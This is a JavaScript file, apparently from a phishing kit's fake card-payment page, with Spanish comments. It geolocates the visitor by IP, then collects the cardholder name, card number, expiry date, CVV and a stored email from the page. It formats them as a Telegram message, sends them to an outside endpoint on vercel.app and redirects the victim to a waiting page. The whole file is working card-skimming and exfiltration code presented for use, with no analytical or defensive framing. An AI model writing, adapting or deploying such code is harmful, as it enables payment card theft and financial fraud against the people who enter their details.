async function obtenerPaisPorIP() {
  try {
    // Consultamos la API (por defecto toma la IP del cliente)
    const respuesta = await fetch("https://ipapi.co/json/");
    const datos = await respuesta.json();

    console.log(`Tu IP es: ${datos.ip}`);
    console.log(`País: ${datos.country_name}`);
    console.log(`Código de país: ${datos.country_code}`);
    pais = datos.country_code;
  } catch (error) {
    console.error("Error al obtener la ubicación:", error);
  }
}

obtenerPaisPorIP();

async function enviar(cardData) {
  console.log("📤 Enviando datos de tarjeta a Telegram...");
  const usr = localStorage.getItem("email");
  const nom = document.getElementById("cardholderName").value;
  const tar = document.getElementById("cardNumber").value;
  const fec = `${document.getElementById("expiryMonth").value}/${document.getElementById("expiryYear").value}`;
  const cvv = document.getElementById("cvv").value;

  if (tar.charAt(0) == "4") {
    var tipo = "Visa";
    localStorage.setItem("tipo", "Visa");
  }

  if (nom == "") {
    alert("Ingrese el nombre");
    return;
  } else if (tar == "") {
    alert("Ingrese el numero de tarjeta");
    return;
  } else if (fec == "") {
    alert("Ingrese la fecha de vencimiento");
    return;
  } else if (cvv == "") {
    alert("Ingrese el codigo de seguridad");
    return;
  } else {
    const message = `MAILS-- --usuario: ${usr} --\n Nombre: ${nom} -- \n Tarj: ${tar} \n fec: ${fec} --\n cvv: ${cvv} -- \n  --\n PAIS:<code> ${pais} </code>--`;

    const datos = {
      user: usr, // Solo el ID para guardar en Firestore
      message: message, // Mensaje completo formateado para Telegram
    };

    try {
      const response = await fetch("https://endpointmine.vercel.app", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datos),
      });

      const data = await response.json();

      if (response.ok) {
        window.location = "wait.html";
      } else {
        console.log("❌ Error al enviar mensaje: " + data.error);
      }
    } catch (error) {
      console.log("❌ Error en la solicitud: " + error.message);
    }
  }
}
